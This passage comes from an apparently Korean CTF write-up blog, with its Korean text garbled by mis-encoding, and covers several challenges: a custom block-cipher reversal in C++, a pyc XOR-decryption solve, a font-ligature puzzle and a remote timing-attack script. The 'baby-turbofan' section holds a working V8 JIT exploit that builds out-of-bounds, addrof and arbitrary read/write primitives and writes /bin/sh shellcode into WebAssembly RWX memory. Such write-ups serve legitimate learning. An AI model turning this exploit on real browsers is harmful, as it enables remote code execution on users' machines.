0xD4, 0x9A, 0x7E, 0xC5, 0x39, 0x67, 0xFE, 0x76, 0x9D, 0x43, 0xA7, 0xE1, 0xD0, 0xF5, 0x68, 0xF2, 0x1B, 0x34, 0x70, 0x05, 0xA3, 0x8A, 0xD5, 0x79, 0x86, 0xA8, 0x30, 0xC6, 0x51, 0x4B, 0x1E, 0xA6, 0x27, 0xF6, 0x35, 0xD2, 0x6E, 0x24, 0x16, 0x82, 0x5F, 0xDA, 0xE6, 0x75, 0xA2, 0xEF, 0x2C, 0xB2, 0x1C, 0x9F, 0x5D, 0x6F, 0x80, 0x0A, 0x72, 0x44, 0x9B, 0x6C, 0x90, 0x0B, 0x5B, 0x33, 0x7D, 0x5A, 0x52, 0xF3, 0x61, 0xA1, 0xF7, 0xB0, 0xD6, 0x3F, 0x7C, 0x6D, 0xED, 0x14, 0xE0, 0xA5, 0x3D, 0x22, 0xB3, 0xF8, 0x89, 0xDE, 0x71, 0x1A, 0xAF, 0xBA, 0xB5, 0x81]g = [0x91,0xd7,0x36,0x58,0x87,0xb1,0x36,0x58,0x87,0xd7,0xce,0x58,0x87,0xd7,0x36,0xd9]p = [0x03, 0x0C, 0x0B, 0x05, 0x08, 0x04, 0x07, 0x0D, 0x0F, 0x00, 0x06, 0x0E, 0x09, 0x01, 0x0A, 0x02]a = bytes(comp)[:16]r = 0xC0FF33def rol(x,n): return ((x &amp;lt;&amp;lt; n) | (x &amp;gt;&amp;gt; (8 - n))) &amp;amp; 0xFFdef sub(a): t = [sbox[i] for i in a] for i in range(16): a[i]=t[i] return adef shift_row(a): for i in range(1,4): a[i],a[i + 4],a[i + 8],a[i + 12]=a[(i - 4 * i)%16],a[(i - 4 * i + 4)%16],a[(i - 4 * i + 8)%16],a[(i - 4 * i + 12)%16] return adef enc(a): x = 0 for _ in range(16): a[x] ^= p[x]|(p[x]&amp;lt;&amp;lt;4) x = p[x] x = 0 for _ in range(16): a[p[x]] += a[x] a[p[x]] &amp;amp;= 0xFF x = p[x] x = 0 for _ in range(16): a[x] = rol(a[x], p[x]&amp;amp;7) x= p[x] return adef xor(a,b): for i in range(16): a[i] ^= b[i] return aa = list(b&#39;zxcvasdfqwer1234&#39;)for _ in tqdm(range(r)): sub(a) shift_row(a) enc(a) xor(a, x) sub(x) shift_row(x) enc(x)print(bytes(a).hex(sep=&#39; &#39;))íŒŒì´ì¬ì„ ì´ìš©í•´ì„œ ì½”ë“œë¥¼ í¬íŒ…í•´ì„œ ì²˜ìŒì—ëŠ” íŒŒì´ì¬ìœ¼ë¡œ ì—­ì—°ì‚° í•˜ë ¤ê³  í–ˆì§€ë§Œì—°ì‚° ì†ë„ê°€ ë„ˆë¬´ ëŠë ¤ì„œ C++ë¡œ ì—­ì—°ì‚° ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•˜ì˜€ë‹¤. Solution Script#include &amp;lt;iostream&amp;gt;using namespace std;unsigned int x[] = {0x21, 0xE5, 0x88, 0xAC, 0xBB, 0xB0, 0x97, 0xEA, 0x16, 0x42, 0x03, 0x0B, 0x9B, 0xD2, 0x5C, 0x6C};unsigned int comp[] = {0x89, 0xB4, 0xF7, 0x8F, 0xE1, 0x8B, 0x29, 0x0D, 0x37, 0xB1, 0x56, 0xC0, 0xF0, 0x75, 0x42, 0x8E, 0x1C, 0xC4, 0x2D, 0x1D, 0xD9, 0x2E, 0xD4, 0x83, 0x55, 0xEE, 0x6B, 0xAD, 0x53, 0x40, 0x79, 0x65, 0x07, 0x9A, 0x0A, 0xB2, 0x9F, 0x82, 0x99, 0x10, 0xDF, 0x45, 0x22, 0x6B, 0x50, 0xDB, 0x0B, 0x40};unsigned int sbox[] = {0xE2, 0x4E, 0x54, 0xFC, 0x94, 0xC2, 0x4A, 0xCC, 0x62, 0x0D, 0x6A, 0x46, 0x3C, 0x4D, 0x8B, 0xD1, 0x5E, 0xFA, 0x64, 0xCB, 0xB4, 0x97, 0xBE, 0x2B, 0xBC, 0x77, 0x2E, 0x03, 0xD3, 0x19, 0x59, 0xC1, 0x1D, 0x06, 0x41, 0x6B, 0x55, 0xF0, 0x99, 0x69, 0xEA, 0x9C, 0x18, 0xAE, 0x63, 0xDF, 0xE7, 0xBB, 0x00, 0x73, 0x66, 0xFB, 0x96, 0x4C, 0x85, 0xE4, 0x3A, 0x09, 0x45, 0xAA, 0x0F, 0xEE, 0x10, 0xEB, 0x2D, 0x7F, 0xF4, 0x29, 0xAC, 0xCF, 0xAD, 0x91, 0x8D, 0x78, 0xC8, 0x95, 0xF9, 0x2F, 0xCE, 0xCD, 0x08, 0x7A, 0x88, 0x38, 0x5C, 0x83, 0x2A, 0x28, 0x47, 0xDB, 0xB8, 0xC7, 0x93, 0xA4, 0x12, 0x53, 0xFF, 0x87, 0x0E, 0x31, 0x36, 0x21, 0x58, 0x48, 0x01, 0x8E, 0x37, 0x74, 0x32, 0xCA, 0xE9, 0xB1, 0xB7, 0xAB, 0x0C, 0xD7, 0xC4, 0x56, 0x42, 0x26, 0x07, 0x98, 0x60, 0xD9, 0xB6, 0xB9, 0x11, 0x40, 0xEC, 0x20, 0x8C, 0xBD, 0xA0, 0xC9, 0x84, 0x04, 0x49, 0x23, 0xF1, 0x4F, 0x50, 0x1F, 0x13, 0xDC, 0xD8, 0xC0, 0x9E, 0x57, 0xE3, 0xC3, 0x7B, 0x65, 0x3B, 0x02, 0x8F, 0x3E, 0xE8, 0x25, 0x92, 0xE5, 0x15, 0xDD, 0xFD, 0x17, 0xA9, 0xBF, 0xD4, 0x9A, 0x7E, 0xC5, 0x39, 0x67, 0xFE, 0x76, 0x9D, 0x43, 0xA7, 0xE1, 0xD0, 0xF5, 0x68, 0xF2, 0x1B, 0x34, 0x70, 0x05, 0xA3, 0x8A, 0xD5, 0x79, 0x86, 0xA8, 0x30, 0xC6, 0x51, 0x4B, 0x1E, 0xA6, 0x27, 0xF6, 0x35, 0xD2, 0x6E, 0x24, 0x16, 0x82, 0x5F, 0xDA, 0xE6, 0x75, 0xA2, 0xEF, 0x2C, 0xB2, 0x1C, 0x9F, 0x5D, 0x6F, 0x80, 0x0A, 0x72, 0x44, 0x9B, 0x6C, 0x90, 0x0B, 0x5B, 0x33, 0x7D, 0x5A, 0x52, 0xF3, 0x61, 0xA1, 0xF7, 0xB0, 0xD6, 0x3F, 0x7C, 0x6D, 0xED, 0x14, 0xE0, 0xA5, 0x3D, 0x22, 0xB3, 0xF8, 0x89, 0xDE, 0x71, 0x1A, 0xAF, 0xBA, 0xB5, 0x81};unsigned int p[] = {0x03, 0x0C, 0x0B, 0x05, 0x08, 0x04, 0x07, 0x0D, 0x0F, 0x00, 0x06, 0x0E, 0x09, 0x01, 0x0A, 0x02};unsigned int inv_sbox[256];unsigned int rol(unsigned int x, unsigned int n){ return ((x &amp;lt;&amp;lt; n) | (x &amp;gt;&amp;gt; (8 - n))) &amp;amp; 0xFF;}unsigned int ror(unsigned int x, unsigned int n){ return ((x &amp;gt;&amp;gt; n) | (x &amp;lt;&amp;lt; (8 - n))) &amp;amp; 0xFF;}void sub(unsigned int a[]){ for(int i = 0; i &amp;lt; 16; i++) a[i]=sbox[a[i]];}void shift_row(unsigned int a[]){ unsigned int d[4]; for(int i = 1; i &amp;lt; 4; i++){ d[0]=a[(i - 4 * i + 64)%16]; d[1]=a[(i - 4 * i + 4 + 64)%16]; d[2]=a[(i - 4 * i + 8 + 64)%16]; d[3]=a[(i - 4 * i + 12 + 64)%16]; a[i]=d[0]; a[i + 4]=d[1]; a[i + 8]=d[2]; a[i + 12]=d[3]; }}void enc(unsigned int a[]){ unsigned int x = 0; for(int i = 0; i &amp;lt; 16; i++){ a[x] ^= p[x]|(p[x]&amp;lt;&amp;lt;4); a[x] &amp;amp;= 0xFF; x = p[x]; } x = 0; for(int i = 0; i &amp;lt; 16; i++){ a[p[x]] += a[x]; a[p[x]] &amp;amp;= 0xFF; x = p[x]; } x = 0; for(int i = 0; i &amp;lt; 16; i++){ a[x] = rol(a[x], p[x]&amp;amp;7); a[x] &amp;amp;= 0xFF; x = p[x]; }}void xr(unsigned int a[],unsigned int b[]){ for(int i = 0;i &amp;lt; 16;i++) a[i] ^= b[i];}void inv_enc(unsigned int a[]){ unsigned int x = 0; unsigned int t[16]; for(int i = 0; i &amp;lt; 16; i++){ t[i] = x; x = p[x]; } for(int i = 0; i &amp;lt; 16; i++){ x = t[15 - i]; a[x] = ror(a[x], p[x]&amp;amp;7); a[x] &amp;amp;= 0xFF; } for(int i = 0; i &amp;lt; 16; i++){ x = t[15 - i]; a[p[x]] -= a[x]; a[p[x]] &amp;amp;= 0xFF; } for(int i = 0; i &amp;lt; 16; i++){ x = t[15 - i]; a[x] ^= p[x]|(p[x]&amp;lt;&amp;lt;4); }}void inv_shift_row(unsigned int a[]){ unsigned int d[4]; for(int i = 1; i &amp;lt; 4; i++){ d[0] = a[i]; d[1] = a[i + 4]; d[2] = a[i + 8]; d[3] = a[i + 12]; a[(i - 4 * i + 64)%16]=d[0]; a[(i - 4 * i + 4 + 64)%16]=d[1]; a[(i - 4 * i + 8 + 64)%16]=d[2]; a[(i - 4 * i + 12 + 64)%16]=d[3]; }}void inv_sub(unsigned int a[]){ for(int i = 0; i &amp;lt; 16; i++) a[i]=inv_sbox[a[i]];}int main(){ // unsigned int a[]= {154, 93, 38, 210, 111, 102, 0, 197, 218, 246, 231, 246, 205, 56, 1, 249}; unsigned int *a= comp; for(int i = 0; i &amp;lt; 256; i++) inv_sbox[sbox[i]]=i; for(int _ = 0; _ &amp;lt; 3; _++){ for(int i = 0;i &amp;lt; 0xC0FF33; i++){ sub(x); shift_row(x); enc(x); } for(int i = 0;i &amp;lt; 0xC0FF33; i++){ inv_enc(x); inv_shift_row(x); inv_sub(x); xr(a, x); inv_enc(a); inv_shift_row(a); inv_sub(a); } for(int i =0; i &amp;lt; 16; i++) cout &amp;lt;&amp;lt; (char)a[i]; a += 16; } cout &amp;lt;&amp;lt; endl;}K. baby-turbofan - Pwnableì²˜ìŒìœ¼ë¡œ í’€ì–´ë³¸ V8 ë¬¸ì œì´ë‹¤.ë¬¸ì œì˜ ë””ìŠ¤í¬ë¦½ì…˜ì—ì„œ ì–¸ê¸‰ë˜ëŠ” KrautflareëŠ” ì•½ê°„ ì˜ˆì „ PlaidCTFì˜ ropasaurusrex ì •ë„ì˜ ê°ì„±ìœ¼ë¡œ ìì£¼ ì–¸ê¸‰ë˜ëŠ” ì…ë¬¸ìš© ë¬¸ì œì¸ ê²ƒ ê°™ì•„ë³´ì˜€ë‹¤.í•´ë‹¹ ë¬¸ì œì—ì„œëŠ” ìœ„ì™€ ë™ì¼í•œ ì·¨ì•½ì ì„ ê°–ê³  ìˆì—ˆì§€ë§Œ, pointer compressionì´ ì ìš©ëœ ë²„ì „ì´ë¼ëŠ” ì°¨ì´ê°€ ì¡´ì¬í•˜ì˜€ë‹¤.V8ì— ëŒ€í•œ ì§€ì‹ì´ ì „ë¬´í–ˆìœ¼ë¯€ë¡œ ë‹¤ë¥¸ ë¬¸ì œì˜ exploitì„ ì§œì§‘ê¸°í•´ì„œ ë””ë²„ê¹…í•˜ëŠ” ë°©ì‹ìœ¼ë¡œ ë°©í–¥ì„ ì •í•˜ì˜€ê³ ì§€ê¸ˆì€ ì¹´ì´ìŠ¤íŠ¸ìƒì¸ ê³ ë“±í•™êµ í›„ë°°ì˜ ë¸”ë¡œê·¸ ê¸€ì„ ë§ì´ ì°¸ê³ í•˜ì—¬ í’€ì´í•˜ì˜€ë‹¤.íŠ¹íˆ 35C3-Krautflareì™€ DownUnder-Is this pwn or web?ì„ ì£¼ë¡œ ì°¸ê³ í•˜ì˜€ë‹¤.ìœ„ ê¸€ì— ì í˜€ìˆëŠ” ìì„¸í•œ ì·¨ì•½ì  ì„¤ëª…ì€ ìƒëµí•˜ê³  ë‚´ê°€ í’€ì´í–ˆë˜ ë°©ë²•ì€ ì•„ë˜ì™€ ê°™ë‹¤. Object.is(-0, -0) * indexë¥¼ ì´ìš©í•˜ì—¬ OOB ë°œìƒ OOBë¥¼ í†µí•´ í™ í¬ì¸í„° ë² ì´ìŠ¤ LEAK ê°ì²´ ë¦¬ìŠ¤íŠ¸ì— ê°’ì„ ë„£ê³  OOBë¥¼ ì´ìš©í•´ ê°ì²´ì˜ ì£¼ì†Œ LEAK ë™ì ë””ë²„ê¹…ì„ ì´ìš©í•˜ì—¬ ì•Œì•„ë‚¸ ArrayBufferì˜ backing storeìœ„ì¹˜ë¥¼ OOBë¥¼ í†µí•´ ì ‘ê·¼í•˜ì—¬ aar, aaw ì‰˜ì½”ë“œ ì‹¤í–‰ì •ë¦¬í•˜ë©´ ì œëª©ì˜ babyê°€ ë¬´ìƒ‰í•˜ì§€ ì•Šì„ ìƒë‹¹íˆ ê°„ë‹¨í•œ ë¬¸ì œì˜€ì§€ë§Œì´í•´í•˜ê³ , ì˜¤í”„ì…‹ì„ êµ¬í•˜ê¸° ìœ„í•´ ê°ì²´ë“¤ì„ ë¶™ì´ê³ , êµ¬í˜„í•˜ëŠ” ë°ì— ì°¸ ë§ì€ ì‹œê°„ì´ ë“¤ì—ˆë‹¤.ë¬´ì–¸ê°€ í•˜ë‚˜ í¬ê²Œ ì–»ì–´ê°„ ë¬¸ì œì˜€ë˜ ê²ƒ ê°™ë‹¤. Exploit Scriptvar buf = new ArrayBuffer(8);var f64_buf = new Float64Array(buf);var u64_buf = new Uint32Array(buf);const print = console.logvar tmp_obj = {X:1}function itof(val) { u64_buf[0] = Number(BigInt(val) &amp;amp; 0xffffffffn); u64_buf[1] = Number(BigInt(val) &amp;gt;&amp;gt; 32n); return f64_buf[0];}function hex(val){ return &quot;0x&quot;+val.toString(16)}var oob = undefined, oo = undefined, arb = undefinedfunction foo(x){ let aux = {mz:-0}; let idx = Object.is(Math.expm1(x), aux.mz); let a = [0.1,0.2,0.3,0.4,0.5]; let b = new BigUint64Array([ 0x1111111111111111n, 0x2222222222222222n, 0x3333333333333333n, ]); let c = [tmp_obj, 1.1, 1.2] let aaaa = new ArrayBuffer(0x1338); oob = b oo = c arb = aaaa idx *= 25; a[idx] = itof(0xFFFFFFFF000023e8n) return a[idx];}foo(0);for(let i = 0; i &amp;lt; 100000; i++) { foo(&quot;0&quot;);}foo(-0)const base = (BigInt(oob[9]) &amp;amp; 0xFFFFFFFFn) &amp;lt;&amp;lt; 32nprint(&quot;HEAP BASE : &quot; + hex(base))function addrof(obj) { oo[0] = obj return base + (oob[13] &amp;amp; 0xFFFFFFFFn)}function aar(addr) { oob[20] = addr let buf = new BigUint64Array(arb); return buf[0];}function aaw(addr, value) { oob[20] = addr if(typeof value == &quot;number&quot;) { let buf = new BigUint64Array(arb); buf[0] = value } else if(typeof value == &quot;string&quot;) { let buf = new Uint8Array(arb); for(let i = 0; i &amp;lt; value.length; i++) { buf[i] = value[i].charCodeAt(); } }}let wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);let wasmModule = new WebAssembly.Module(wasmCode);let wasmInstance = new WebAssembly.Instance(wasmModule); let wasmFunction = wasmInstance.exports.main;const Instance = addrof(wasmInstance)const rwx = aar(addrof(wasmInstance)+0x5Fn)print(&quot;RWX : &quot;+hex(rwx))let shellcode = &quot;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x48\\x31\\xc0\\xb0\\x3b\\x99\\x4d\\x31\\xd2\\x0f\\x05&quot;;aaw(rwx, shellcode)wasmFunction()// while(1); // for debug// ##END_OF_FILE##L. input box - MiscFontì˜ GSUBì„ ì´ìš©í•˜ì—¬ ì˜¬ë°”ë¥¸ í”Œë˜ê·¸ê°€ ì…ë ¥ë˜ì—ˆë‹¤ë©´ GOOD ì´ë¯¸ì§€ë¥¼ ì¶œë ¥í•˜ëŠ” ë¬¸ì œì´ë‹¤.ëŒ€ì¶© ì…ë ¥í•´ë³´ë©´ ì•„ìŠ¤í‚¤ ë²”ìœ„ì˜ ëª¨ë“  ë¬¸ìë“¤ì— ì–´ë– í•œ ì´ë¯¸ì§€ë„ ë§¤í•‘ì´ ë˜ì–´ìˆì§€ ì•Šì€ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤,otfíŒŒì¼ì„ ttxë¡œ íŒŒì‹±í•´ì„œ ë³´ë©´ G00979ì˜ widthë§Œ ë‹¤ë¥¸ ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤.ë”°ë¼ì„œ í•´ë‹¹ Glyphê°€ í”Œë˜ê·¸ì˜ ëì„ ì˜ë¯¸í•œë‹¤.í•´ë‹¹ Glyphë¥¼ í¬í•¨í•˜ëŠ” Ligatureë¥¼ ê°–ê³  ìˆëŠ” LigatureSetì„ ì°¾ìœ¼ë©´Glyph G00923ë¥¼ ì†ì„±ìœ¼ë¡œ ê°–ëŠ” LigatureSetì´ G00979ë¥¼ Component=bracerightì¸ Ligatureë¡œ ê°–ê³  ìˆë‹¤.ë”°ë¼ì„œ í”Œë˜ê·¸ì˜ ë§ˆì§€ë§‰ ê¸€ìëŠ” }Glyph G00923ë¥¼ í¬í•¨í•˜ëŠ” Ligatureë¥¼ ê°–ê³  ìˆëŠ” LigatureSetì„ ì°¾ìœ¼ë©´Glyph G00877ë¥¼ ì†ì„±ìœ¼ë¡œ ê°–ëŠ” LigatureSetì´ G00923ë¥¼ Component=numbersignì¸ Ligatureë¡œ ê°–ê³  ìˆë‹¤.ë”°ë¼ì„œ í”Œë˜ê·¸ì˜ ë§ˆì§€ë§‰ì—ì„œ ë‘ë²ˆì§¸ ê¸€ìëŠ” #ì´ëŸ¬í•œ ë°˜ë³µí•˜ë©´ í”Œë˜ê·¸ë¥¼ ì–»ì„ìˆ˜ ìˆì—ˆë‹¤.íŒŒì‹± ì½”ë“œë¥¼ ì§¤ ì‹œê°„ì— ì†ìœ¼ë¡œ êµ¬í•˜ê³  ë§Œë‹¤ëŠ” ë§ˆì¸ë“œë¡œ Ctrl+Fë¥¼ ì´ìš©í•´ì„œ í’€ì—ˆê¸° ë•Œë¬¸ì— ì½”ë“œê°€ ì—†ë‹¤.ë¬¸ì œì˜ ê²°ì€ ë§ì´ ë‹¤ë¥´ì§€ë§Œ í”Œë˜ê·¸ë¥¼ ì½ê³  redpwn 2021ì— ì¶œì œëœ misc ë¬¸ì œê°€ ìƒê°ì´ ë‚¬ë‹¤.M. pyc - Reversingpyc ë°ì´í„°ë¥¼ ê°–ê³ ìˆëŠ” íŒŒì¼ì„ ë¶„ì„í•˜ëŠ” ì»¨ì…‰ì˜ ë¬¸ì œì´ë‹¤.ìš°ì„  ì£¼ì–´ì§„ íŒŒì¼ì„ ë””ìŠ¤ì–´ì…ˆí•œ í›„ì— ë””ìŠ¤ì–´ì…ˆëœ íŒŒì¼ì„ ë³´ë©´chkì™€ throwë¼ëŠ” í•¨ìˆ˜ê°€ ì¡´ì¬í•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.ê·¸ ì¤‘, throwë¼ëŠ” í•¨ìˆ˜ê°€ chk.__code__ ì—ë‹¤ê°€ mì´ë¼ëŠ” ë¦¬ìŠ¤íŠ¸ì— ë‹´ê¸´ ê°’ìœ¼ë¡œ xorì„ í•˜ê³  ì¸í’‹ì„ ì¸ìë¡œ chkì„ í˜¸ì¶œí•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.ë•Œë¬¸ì— ì•„ë˜ì™€ ê°™ì´ pyc ë°ì´í„°ì— xorí•˜ëŠ” ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•˜ì˜€ë‹¤.a = bytes.fromhex(&quot;74006401 83017D01 74016401 64026702 83017D01 7402A003 7C026403 A102A004 64026403 A1027D02 64047D03 64057D04 64067D05 64077D06 64087D07 74007402 74056409 83018301 83017D08 74068300 7D087407 74067C00 83017408 83024400 5D0B5C02 7D017D09 7C08A009 7C017C09 4100A101 01007130 740A7C08 83015300 290A4E72 57000000 72620000 00DA06&quot;) # chk.__code__m = [0, 0, 16, 0, 255, 1, 254, 0, 16, 0, 124, 1, 231, 3, 35, 2, 222, 53, 0, 0, 0, 0, 0, 0, 0, 2, 24, 2, 221, 3, 196, 6, 115, 2, 225, 1, 184, 2, 25, 1, 197, 6, 0, 1, 24, 5, 25, 4, 24, 7, 248, 7, 125, 7, 1, 4, 24, 9, 25, 3, 99, 0, 16, 7, 98, 5, 91, 9, 255, 3, 231, 5, 255, 0, 101, 8, 16, 3, 149, 0, 67, 8, 54, 7, 16, 0, 60, 0, 231, 6, 53, 8, 35, 6, 32, 2, 57, 8, 253, 0, 106, 1, 1, 9, 0, 9, 196, 11, 107, 1, 24, 9, 196, 2, 184, 1, 22, 0, 12, 48, 5, 2, 0, 8, 208, 1]print(bytes(i^j for i,j in zip(a,m+[0]*200)).hex())ìœ„ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•˜ì—¬ ë‚˜ì˜¨ ì•„ì›ƒí’‹ì„ ë‹¤ì‹œ ì†ìˆ˜ hex editorë¡œ ë„£ì–´ì£¼ë©´ chkì˜ ë””ìŠ¤ì–´ì…ˆëœ ì½”ë“œê°€ ë°”ë€ë‹¤.í•´ë‹¹ í•¨ìˆ˜ë¥¼ hand-rayë¡œ ë””ì»´íŒŒì¼í•˜ë©´ ì•„ë˜ì™€ ê°™ë‹¤def chk(ipt): for i in range(len(ipt)-3): r0 = int.from_bytes(ipt[i:i+4], &#39;little&#39;) ipt = ipt[:i]+((((r0 &amp;gt;&amp;gt; ((i + 16)%32)) | (r0 &amp;lt;&amp;lt; ((-i + 16)%32))) &amp;amp; 0xFFFFFFFF)^0xDEADBEEF).to_bytes(4, &#39;little&#39;)+ipt[i+4:] return iptë³µì¡í•˜ì§€ ì•Šì€ ì—°ì‚°ì´ë¯€ë¡œ ì—­ì—°ì‚° ì½”ë“œë¥¼ ì‘ì„±í•˜ì—¬ í”Œë˜ê·¸ë¥¼ íœ™ë“í•˜ì˜€ë‹¤. Solution Scriptk = [161, 55, 37, 106, 136, 128, 88, 143, 139, 247, 182, 192, 140, 132, 222, 141, 79, 38, 69, 75, 184, 232, 66, 72, 152, 14, 202, 49, 143, 58, 194, 161, 241, 230, 237, 118, 254, 112, 85, 32, 220, 192, 179, 201, 216, 132, 141, 42, 53]key = [239, 88, 97, 17, 198, 239, 121, 208, 223, 159, 135, 245, 211, 181, 173, 210, 1, 22, 49, 20, 254, 132, 118, 15, 199, 87, 250, 100, 208, 84, 241, 146, 149, 185, 153, 70, 161, 2, 48, 86, 131, 173, 220, 187, 189, 165, 205, 9, 72]m = [0, 0, 16, 0, 255, 1, 254, 0, 16, 0, 124, 1, 231, 3, 35, 2, 222, 53, 0, 0, 0, 0, 0, 0, 0, 2, 24, 2, 221, 3, 196, 6, 115, 2, 225, 1, 184, 2, 25, 1, 197, 6, 0, 1, 24, 5, 25, 4, 24, 7, 248, 7, 125, 7, 1, 4, 24, 9, 25, 3, 99, 0, 16, 7, 98, 5, 91, 9, 255, 3, 231, 5, 255, 0, 101, 8, 16, 3, 149, 0, 67, 8, 54, 7, 16, 0, 60, 0, 231, 6, 53, 8, 35, 6, 32, 2, 57, 8, 253, 0, 106, 1, 1, 9, 0, 9, 196, 11, 107, 1, 24, 9, 196, 2, 184, 1, 22, 0, 12, 48, 5, 2, 0, 8, 208, 1]def dec(ipt): for i in list(range(len(ipt)-3))[::-1]: r0 = int.from_bytes(ipt[i:i+4], &#39;little&#39;)^0xDEADBEEF ipt = ipt[:i]+((((r0 &amp;lt;&amp;lt; ((i + 16)%32)) | (r0 &amp;gt;&amp;gt; ((-i + 16)%32))) &amp;amp; 0xFFFFFFFF)).to_bytes(4, &#39;little&#39;)+ipt[i+4:] return iptipt = bytes(k)# ipt = bytes(i^j for i,j in zip(k,key)) # chk function&#39;s routine before xorprint(dec(ipt))N. Leetcode - MiscíŒŒì´ì¬ì„ ì½”ë“œì— ëŒ€í•œ íƒ€ì´ë° ê³µê²©ì´ ì»¨ì…‰ì¸ ë¬¸ì œì´ë‹¤.ì£¼ì–´ì§„ íŒŒì´ì¬ íŒŒì¼ì„ ëŒ€ì¶© ê¹”ë”í•˜ê²Œ ì •ë¦¬í•˜ë©´ ì•„ë˜ì™€ ê°™ë‹¤.while \\ not (k := k if &quot;k&quot; in vars() else lambda c : __import__(&quot;functools&quot;).reduce(lambda f, g: lambda x: f(g(f(x))), [lambda x : __import__(&quot;hashlib&quot;).sha512(x).digest()] * 16, lambda x: x)(c)) or\\ not (s := s if &quot;s&quot; in vars() else __import__(&quot;secret&quot;).s.hex()) or\\ not (i := input().strip().ljust(16)) or\\ any(any(k(x.encode()) != k(y.encode()) for x, y in zip(s[4 * t: 4 * t + 4], i[4 * t: 4 * t + 4])) for t in __import__(&quot;random&quot;).sample([0, 1, 2, 3], 4)) or\\ print(open(&quot;flag&quot;).read()): print(&quot;ğŸ¤”&quot;, end=&quot;&quot;)16ë°”ì´íŠ¸ì˜ ì…ë ¥ì„ ë°›ê³  í•´ë‹¹ ì…ë ¥ì„ 4ë°”ì´íŠ¸ì”© ë¸”ë¡ìœ¼ë¡œ ìª¼ê°  í›„,ëœë¤í•œ ìˆœì„œì˜ ë¸”ë¡ë“¤ì„ ì•ì—ì„œë¶€í„° ìˆœì°¨ì ìœ¼ë¡œ secret.hex()ì˜ ë™ì¼í•œ ì¸ë±ìŠ¤ì™€ ë¹„êµí•œë‹¤.ì´ë•Œ ë¹„êµë¥¼ ìœ„í•´ ì‚¬ìš©ë˜ëŠ” kí•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ë©´ ë¬´ìˆ˜íˆ ë§ì€ sha512ì˜ ìš”ì²­ì´ ìŸì•„ì§€ê³ pythonì€ ê° ë°”ì´íŠ¸ë¥¼ ë¹„êµí•˜ëŠ” ë°ì— ê½¤ ë§ì€ ì‹œê°„ì´ ê±¸ë¦°ë‹¤.ë”°ë¼ì„œ ì…ë ¥ì„ ë‚ ë ¸ì„ ë•Œ ì•„ì›ƒí’‹ì´ ëŒì•„ì˜¤ê¸°ê¹Œì§€â€œì¢€ ì˜¤ë˜ ê±¸ë¦¬ëŠ” ê±° ê°™ì€ë°?â€ë¼ëŠ” ìƒê°ì´ ë“¤ë©´ ë§ëŠ” ì…ë ¥ì„ ë‚ ë¦° ê²ƒì´ë‹¤.ê·¸ë˜ì„œ ìë™ìœ¼ë¡œ ì…ë ¥ì„ ë§Œë“¤ê³ , ì‘ë‹µì‹œê°„ì„ ê¸°ë°˜ìœ¼ë¡œ ë§ëŠ” ê²ƒ ê°™ì€ ë¬¸ìë¥¼ ê³¨ë¼ì£¼ëŠ” ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•˜ë ¤ê³  í–ˆì§€ë§Œì‘ë‹µì‹œê°„ì„ ê²°ì •í•˜ëŠ” ë³€ìˆ˜ê°€ ë„ˆë¬´ ë§ì•˜ê¸° ë–„ë¬¸ì—, ì´ë¥¼ ì •êµí•˜ê²Œ ë§Œë“œëŠ” ê²ƒì´ ì–´ë ¤ì›Œ ì‘ë‹µì‹œê°„ì„ ë¿Œë ¤ì£¼ê³  ì§ì ‘ ëˆˆìœ¼ë¡œ ë³´ê³  ê²°ì •í•  ìˆ˜ ìˆê²Œë” ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•˜ì˜€ë‹¤.from pwn import *from itertools import productfrom tqdm import tqdmfrom time import timep = remote(&#39;host1.dreamhack.games&#39;, 9347)# p = process([&#39;python3&#39;, &#39;-u&#39;, &#39;./chal.py&#39;])p.sendline(&#39;&#39;)p.recv(4)r = &#39;&#39;for _ in range(16): u = [] for i in (&#39;0123456789abcdef&#39;[:]): g = [] for j in range(16): pay = (r+i)[:4].ljust(4)*4 p.sendline(pay.encode()) a = time() p.recv(4) b = time() g.append(b - a) print(sorted(g)[-6:],i)p.interactive()ê°€ì¥ ì²˜ìŒ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ëŒë¦´ ë•Œì—”ë‹¤ë¥¸ ë¬¸ìë“¤ ëŒ€ë¹„ ì‘ë‹µ ì‹œê°„ì´ ê· ì¼í•˜ì§€ ì•Šì€ ë¬¸ì 4ê°œê°€ ì¡´ì¬í•œë‹¤.ì´ëŠ” í•´ë‹¹ ë¬¸ìë“¤ì„ ë¹„êµí–ˆì„ ë•Œ í†µê³¼ê°€ ë˜ì–´ë‹¤ìŒ ë°”ì´íŠ¸ì— ëŒ€í•œ ë¹„êµê°€ ì´ë£¨ì–´ì¡Œê¸° ë•Œë¬¸ì— ì‘ë‹µì‹œê°„ì˜ ì°¨ì´ê°€ ë°œìƒí•œ ê²ƒìœ¼ë¡œ ë³¼ ìˆ˜ ìˆë‹¤.ë”°ë¼ì„œ í•´ë‹¹ 4ê°œì˜ ë¬¸ìê°€ ê° ë¸”ë¡ì˜ ì²«ë²ˆì§¸ ê¸€ìê°€ ëœë‹¤.ì´í›„ ê° ë¸”ë¡ì˜ ì²«ë²ˆì§¸ ê¸€ìë¥¼ rì— ë„£ì–´ ì‹¤í–‰í•œë‹¤.ì´ë•Œ, ëœë¤í•œ ë¹„êµ ìˆœì„œ ë•Œë¬¸ì—ì…ë ¥ìœ¼ë¡œ ë³´ë‚¸ ë¬¸ìì—´ì´ 